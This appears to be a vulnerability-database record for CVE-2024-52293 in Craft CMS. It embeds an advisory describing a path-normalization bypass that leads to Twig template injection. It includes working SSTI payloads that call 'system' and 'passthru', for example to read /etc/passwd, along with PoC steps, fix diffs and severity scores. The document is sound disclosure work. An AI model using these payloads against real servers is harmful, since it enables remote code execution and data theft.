@@ -1,0 +1,536 @@
+vulnerability_id: VCID-v16v-gsw6-73hb
+aliases:
+  - CVE-2024-52293
+  - GHSA-f3cw-hg6r-chfv
+summary: |
+  Craft CMS vulnerable to Potential Remote Code Execution via missing path normalization & Twig SSTI
+  ### Summary
+
+  Missing `normalizePath` in the function `FileHelper::absolutePath` could lead to Remote Code Execution on the server via twig SSTI.
+
+  `(Post-authentication, ALLOW_ADMIN_CHANGES=true)`
+
+  ### Details
+
+  Note: This is a sequel to [CVE-2023-40035](https://github.com/craftcms/cms/security/advisories/GHSA-44wr-rmwq-3phw)
+
+  In [`src/helpers/FileHelper.php#L106-L137`](https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/helpers/FileHelper.php#L106-L137), the function `absolutePath` returned `$from . $ds . $to` without path normalization:
+
+  ```php
+  /**
+   * Returns an absolute path based on a source location or the current working directory.
+   *
+   * @param string $to The target path.
+   * @param string|null $from The source location. Defaults to the current working directory.
+   * @param string $ds the directory separator to be used in the normalized result. Defaults to `DIRECTORY_SEPARATOR`.
+   * @return string
+   * @since 4.3.5
+   */
+  public static function absolutePath(
+      string $to,
+      ?string $from = null,
+      string $ds = DIRECTORY_SEPARATOR,
+  ): string {
+      $to = static::normalizePath($to, $ds);
+
+      // Already absolute?
+      if (
+          str_starts_with($to, $ds) ||
+          preg_match(sprintf('/^[A-Z]:%s/', preg_quote($ds, '/')), $to)
+      ) {
+          return $to;
+      }
+
+      if ($from === null) {
+          $from = FileHelper::normalizePath(getcwd(), $ds);
+      } else {
+          $from = static::absolutePath($from, ds: $ds);
+      }
+
+      return $from . $ds . $to;
+  }
+  ```
+
+  This could leads to multiple security risks, one of them is in [`src/services/Security.php#L201-L220`](https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/services/Security.php#L201-L220) where `../templates/poc` is not considered a system dir.
+
+  Let's see what happens after calling `isSystemDir("../templates/poc")`:
+
+  ```php
+  /**
+   * Returns whether the given file path is located within or above any system directories.
+   *
+   * @param string $path
+   * @return bool
+   * @since 5.4.2
+   */
+  public function isSystemDir(string $path): bool // $path = "../templates/poc"
+  {
+      $path = FileHelper::absolutePath($path, '/'); // $path = "/var/www/html/web//../templates/poc"
+
+      foreach (Craft::$app->getPath()->getSystemPaths() as $dir) {
+          $dir = FileHelper::absolutePath($dir, '/'); // $dir = "/var/www/html/templates"
+          if (str_starts_with("$path/", "$dir/") || str_starts_with("$dir/", "$path/")) { // if (false || false)
+              return true;
+          }
+      }
+
+      return false; // We're here!
+  }
+  ```
+
+  Now that the path `../templates/poc` can bypass `isSystemDir`, it will also bypass the function `validatePath` in [`src/fs/Local.php#L124-L136`](https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/fs/Local.php#L124-L136):
+  ```php
+  /**
+   * @param string $attribute
+   * @param array|null $params
+   * @param InlineValidator $validator
+   * @return void
+   * @since 4.4.6
+   */
+  public function validatePath(string $attribute, ?array $params, InlineValidator $validator): void
+  {
+      if (Craft::$app->getSecurity()->isSystemDir($this->getRootPath())) {
+          $validator->addError($this, $attribute, Craft::t('app', 'Local filesystems cannot be located within or above system directories.'));
+      }
+  }
+  ```
+
+  We can now create a Local filesystem within the system directories, particularly in `/var/www/html/templates/poc`
+
+  Then create a new asset volume with that filesystem, upload a `poc.ttml` file with twig code and execute using a new route with template path `poc/poc.ttml`
+
+  Although craftcms does sandbox twig ssti, the list in [src/web/twig/Extension.php#L180-L268](https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/web/twig/Extension.php#L180-L268) is still incomplete.
+
+
+  ```js
+  {{['id'] has some 'system'}}
+  {{['ls'] has every 'passthru'}}
+  {{['cat /etc/passwd']|find('system')}}
+  {{['id;pwd;ls -altr /']|find('passthru')}}
+  ```
+
+  These payloads still work, see [twigphp/Twig/src/Extension/CoreExtension.php#getFilters()](https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L196-L247) and [twigphp/Twig/src/Extension/CoreExtension.php#getOperators()](https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L291-L333) for more informations.
+
+  ### PoC
+
+  1. Craft CMS was installed using https://craftcms.com/docs/4.x/installation.html#quick-start
+
+  ```sh
+  mkdir craftcms && cd craftcms
+  ddev config --project-type=craftcms --docroot=web --create-docroot
+  ddev composer create -y --no-scripts "craftcms/craft"
+  ddev craft install
+  php craft setup/security-key
+  ddev start
+  ```
+
+  <img width="1280" alt="start" src="https://github.com/user-attachments/assets/f8bcc22a-6ffd-40a5-81c6-c077fa4ce1d3">
+
+  2. Create a new filesystem with base path `../templates/poc`
+
+  <img width="1280" alt="filesystem" src="https://github.com/user-attachments/assets/fe78e023-bd51-4fc1-a22e-dcfa5baf266b">
+
+  Notice that the `poc` directory was created
+
+  <img width="167" alt="dir" src="https://github.com/user-attachments/assets/ccc45ce8-8555-4aae-ae48-320a630e7d79">
+
+  3. Create a new asset volume using the `poc` filesystem
+
+  <img width="1280" alt="asset" src="https://github.com/user-attachments/assets/b5530766-11b4-4e45-ae58-82f81fc2db00">
+
+  Upload a `poc.ttml` file with RCE template code
+
+  ```js
+  {{'<pre>'}}
+  {{ 8*8 }}
+  {{['id'] has some 'system'}}
+  {{['ls'] has every 'passthru'}}
+  {{['cat /etc/passwd']|find('system')}}
+  {{['id;pwd;ls -altr /']|find('passthru')}}
+  ```
+
+  Note: `find` was added to twig [last month](https://github.com/twigphp/Twig/commit/4e262511930e408e4c7eda07b1c977f2ea98575c). If you're running this poc on an older version of twig try removing the last 2 lines.
+
+  <img width="1280" alt="upload" src="https://github.com/user-attachments/assets/63e65beb-2ede-4141-85d2-e7d21cd4b8ad">
+
+  ![ttml](https://github.com/user-attachments/assets/9db8ca9b-25eb-4014-a7f5-4ece895b106d)
+
+  4. Create a new route `*` with template `poc/poc.ttml`
+
+  <img width="1280" alt="route" src="https://github.com/user-attachments/assets/b92d9340-b6a5-40d8-a8e8-ddab5cfc9f21">
+
+  5. This leads to Remote Code Execution on arbitrary route `/*`
+
+  <img width="454" alt="rce" src="https://github.com/user-attachments/assets/19765f6c-1c28-4a0b-a89c-25f6f05ceca6">
+
+  ### Remediation
+
+  ```diff
+  diff --git a/src/helpers/FileHelper.php b/src/helpers/FileHelper.php
+  index 0c2da884a7..ac23ce556a 100644
+  --- a/src/helpers/FileHelper.php
+  +++ b/src/helpers/FileHelper.php
+  @@ -133,7 +133,7 @@ class FileHelper extends \yii\helpers\FileHelper
+               $from = static::absolutePath($from, ds: $ds);
+           }
+
+  -        return $from . $ds . $to;
+  +        return FileHelper::normalizePath($from . $ds . $to);
+       }
+
+       /**
+  ```
+
+  ![fix_norm](https://github.com/user-attachments/assets/4c8e5b4f-6216-416c-87a1-9b9fae033971)
+
+  See [twigphp/Twig/src/Extension/CoreExtension.php](https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php) for updated filters and operators, a possible fix could look like:
+
+  ```diff
+  diff --git a/src/web/twig/Extension.php b/src/web/twig/Extension.php
+  index efff2d2412..756f452f8b 100644
+  --- a/src/web/twig/Extension.php
+  +++ b/src/web/twig/Extension.php
+  @@ -225,6 +225,9 @@ class Extension extends AbstractExtension implements GlobalsInterface
+               new TwigFilter('lcfirst', [$this, 'lcfirstFilter']),
+               new TwigFilter('literal', [$this, 'literalFilter']),
+               new TwigFilter('map', [$this, 'mapFilter'], ['needs_environment' => true]),
+  +            new TwigFilter('find', [$this, 'find'], ['needs_environment' => true]),
+  +            new TwigFilter('has some' => ['precedence' => 20, 'class' => HasSomeBinary::class, 'associativity' => ExpressionParser::OPERATOR_LEFT]),
+  +            new TwigFilter('has every' => ['precedence' => 20, 'class' => HasEveryBinary::class, 'associativity' => ExpressionParser::OPERATOR_LEFT]),
+               new TwigFilter('markdown', [$this, 'markdownFilter'], ['is_safe' => ['html']]),
+               new TwigFilter('md', [$this, 'markdownFilter'], ['is_safe' => ['html']]),
+               new TwigFilter('merge', [$this, 'mergeFilter']),
+  ```
+
+  ![fix_ssti](https://github.com/user-attachments/assets/5d9ce9be-022b-4853-a5f9-688b247cc27c)
+
+  ### Impact
+
+  Take control of vulnerable systems, Data exfiltrations, Malware execution, Pivoting, etc.
+
+  Although the vulnerability is exploitable only in the authenticated users, configuration with `ALLOW_ADMIN_CHANGES=true`, there is still a potential security threat (Remote Code Execution)
+severities:
+  - score: '0.00044'
+    scoring_system: epss
+    scoring_elements: '0.11755'
+    published_at: '2024-11-18 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32819'
+    published_at: '2024-12-15 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32754'
+    published_at: '2024-12-17 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32762'
+    published_at: '2024-12-19 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32747'
+    published_at: '2024-12-27 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.33127'
+    published_at: '2025-01-16 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32730'
+    published_at: '2024-12-13 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32296'
+    published_at: '2024-11-21 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32406'
+    published_at: '2024-11-23 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32407'
+    published_at: '2024-11-24 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32413'
+    published_at: '2024-11-26 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32432'
+    published_at: '2024-11-28 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32459'
+    published_at: '2024-12-03 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32670'
+    published_at: '2024-12-11 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.00070'
+    scoring_system: epss
+    scoring_elements: '0.32271'
+    published_at: '2024-11-20 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01497'
+    scoring_system: epss
+    scoring_elements: '0.80011'
+    published_at: '2025-04-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01497'
+    scoring_system: epss
+    scoring_elements: '0.80033'
+    published_at: '2025-04-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01497'
+    scoring_system: epss
+    scoring_elements: '0.8006'
+    published_at: '2025-04-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01497'
+    scoring_system: epss
+    scoring_elements: '0.80064'
+    published_at: '2025-04-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01497'
+    scoring_system: epss
+    scoring_elements: '0.80076'
+    published_at: '2025-04-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01497'
+    scoring_system: epss
+    scoring_elements: '0.80071'
+    published_at: '2025-04-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01497'
+    scoring_system: epss
+    scoring_elements: '0.80053'
+    published_at: '2025-04-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.79474'
+    published_at: '2025-04-04 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.79528'
+    published_at: '2025-04-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.79518'
+    published_at: '2025-04-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.7951'
+    published_at: '2025-04-09 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.79495'
+    published_at: '2025-04-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.7949'
+    published_at: '2025-04-07 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.79401'
+    published_at: '2025-03-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.79491'
+    published_at: '2025-04-06 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.79391'
+    published_at: '2025-03-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.79451'
+    published_at: '2025-04-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.79457'
+    published_at: '2025-04-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01501'
+    scoring_system: epss
+    scoring_elements: '0.79494'
+    published_at: '2025-04-05 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01665'
+    scoring_system: epss
+    scoring_elements: '0.81036'
+    published_at: '2025-04-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01665'
+    scoring_system: epss
+    scoring_elements: '0.81039'
+    published_at: '2025-04-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01665'
+    scoring_system: epss
+    scoring_elements: '0.81043'
+    published_at: '2025-04-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01665'
+    scoring_system: epss
+    scoring_elements: '0.81052'
+    published_at: '2025-04-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01665'
+    scoring_system: epss
+    scoring_elements: '0.81049'
+    published_at: '2025-04-26 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01665'
+    scoring_system: epss
+    scoring_elements: '0.81047'
+    published_at: '2025-04-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01667'
+    scoring_system: epss
+    scoring_elements: '0.80525'
+    published_at: '2025-04-12 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01667'
+    scoring_system: epss
+    scoring_elements: '0.80528'
+    published_at: '2025-04-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.01667'
+    scoring_system: epss
+    scoring_elements: '0.8052'
+    published_at: '2025-04-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: '0.05205'
+    scoring_system: epss
+    scoring_elements: '0.82837'
+    published_at: '2025-03-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-f3cw-hg6r-chfv
+  - score: '7.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/craftcms/cms
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/craftcms/cms
+  - score: '7.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/craftcms/cms/commit/123e48a696de1e2f63ab519d4730eb3b87beaa58
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/craftcms/cms/commit/123e48a696de1e2f63ab519d4730eb3b87beaa58
+  - score: Track*
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:T/P:M/B:A/M:M/D:R/2024-11-13T18:54:41Z/
+    published_at: None
+    url: https://github.com/craftcms/cms/commit/123e48a696de1e2f63ab519d4730eb3b87beaa58
+  - score: '7.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv
+  - score: Track*
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:T/P:M/B:A/M:M/D:R/2024-11-13T18:54:41Z/
+    published_at: None
+    url: https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv
+  - score: '7.2'
+    scoring_system: cvssv3
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-52293
+  - score: '7.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-52293
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-52293
+weaknesses:
+  - CWE-22
+  - CWE-94
+  - CWE-937
+  - CWE-1035
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-52293
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms/commit/123e48a696de1e2f63ab519d4730eb3b87beaa58
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-52293
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:craftcms:craft_cms:*:*:*:*:*:*:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:craftcms:craft_cms:*:*:*:*:*:*:*:*
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:craftcms:craft_cms:4.0.0:rc1:*:*:*:*:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:craftcms:craft_cms:4.0.0:rc1:*:*:*:*:*:*
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:craftcms:craft_cms:4.0.0:rc2:*:*:*:*:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:craftcms:craft_cms:4.0.0:rc2:*:*:*:*:*:*
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:craftcms:craft_cms:4.0.0:rc3:*:*:*:*:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:craftcms:craft_cms:4.0.0:rc3:*:*:*:*:*:*
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:craftcms:craft_cms:5.0.0:rc1:*:*:*:*:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:craftcms:craft_cms:5.0.0:rc1:*:*:*:*:*:*
+  - url: https://github.com/advisories/GHSA-f3cw-hg6r-chfv
+    reference_type:
+    reference_id: GHSA-f3cw-hg6r-chfv
